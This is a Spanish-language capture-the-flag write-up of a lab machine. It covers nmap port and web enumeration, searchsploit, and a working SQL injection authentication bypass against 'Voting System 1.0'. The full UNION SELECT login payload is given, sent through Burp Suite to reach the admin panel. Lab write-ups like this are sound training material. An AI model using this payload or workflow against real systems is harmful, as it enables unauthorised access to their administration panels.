
# Enumeración

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.48.103 -oG allPorts
```

```shell

 [*] IP Address: 10.129.48.103
 [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670
```

```shell
nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -sCV 10.129.48.103 -oN targeted
```


## 80
En el puerto 80 encontramos un panel de login de `Voting System`

```shell
nmap --script http-enum -p 80 10.129.48.103 -oN WebScan 
```

```shell
/admin/: Possible admin folder
/admin/index.php: Possible admin folder
/Admin/: Possible admin folder
/icons/: Potentially interesting folder w/ directory listing
/images/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
/includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
```

Encontramos un panel de login de `Admin` así que vamos a buscar vulnerabilidades que pueda tener el sistema de `Voting System`, vamos a usar [[SEARCHSPLOIT]]
```shell
searchsploit "voting system"
```

Encontramos una vulnerabilidad llamada `Voting System 1.0 - Authentication Bypass (SQLI)`, se nos indica un archivo `.txt` con el cual podemos intentar explotar esta vulnerabilidad, nos los traemos a la maquina con
```shell
searchsploit "voting system" -m php/webapps/49843.txt

```

Utilizaremos [[BURPSUITE]] para poder explotarlo interceptando la petición y pudiendo modificarla

### SQL Injection
Como vemos en la explotación que nos indica que hay que realizar en el archivo obtenido anteriormente, debemos de modificar los valores del campo de `login`.
Usando [[BURPSUITE]], interceptaremos la petición y en el campo mencionado introduciremos el payload que se nos aporta
```sql
login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
```

Enviamos la petición y desactivamos el proxy y vemos que hemos concedido acceder al panel de administración.

Esta vulnerabilidad se acontece por la falta de validación y parametrización de la entrada del usuario en la consulta SQL

